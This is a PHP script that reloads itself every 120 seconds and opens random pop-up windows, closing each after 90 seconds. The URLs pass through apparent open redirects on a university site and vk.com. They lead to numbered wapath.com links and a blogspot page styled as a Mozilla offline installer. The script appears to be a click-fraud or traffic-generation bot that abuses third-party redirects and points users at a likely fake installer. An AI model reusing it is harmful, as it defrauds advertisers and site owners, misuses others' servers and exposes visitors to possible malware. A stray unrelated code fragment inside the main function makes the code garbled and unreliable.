<meta http-equiv="refresh" content="120" >
<?php

error_reporting(0);
ini_set('display_errors', 0);
    session_start();

    function checkUrl($url, $urls){
        if(count($_SESSION['visited']) == count($urls)){
               $_SESSION['visited'] = Array();
        }
        if(in_array($url, $_SESSION['visited'])){
             $url = $urls[array_rand($urls)];
             checkUrl($url, $urls);
			  if (is_array($this->roles)) {
          if (!in_array($role, $this->roles, true)) {
              $this->roles[] = $role;
          }
      }
        }
        else{
             $_SESSION['visited'][] = $url;
            // header("Location: http://$url," );
			//echo "<script type=\"text/javascript\">window.open('$url', '_blank') </script>";
echo "<script type='text/javascript'>var win=window.open('$url','toolbar=yes,location=yes,directories=yes,status=yes,menubar=yes,scrollbars=yes,copyhistory=yes,resizable=yes');
setTimeout(function () { win.close();}, 90000);
</script>";
			
		
 


        }
    }
    $urls = array(
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link1.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link2.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link3.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link4.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link5.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link6.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link7.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link8.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link9.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link10.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link11.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link12.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link13.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link14.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link15.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link16.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link17.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link18.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link19.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link20.wapath.com/",
"http://www.usc.edu/e_resources/rec.php?id=12324&rurl=http%3A//link21.wapath.com/",
"http://vk.com/away.php?to=http%3A//mozillaofflineinstaller.blogspot.com/"


    );
    $url = $urls[array_rand($urls)];
    checkUrl($url, $urls);
	
?>
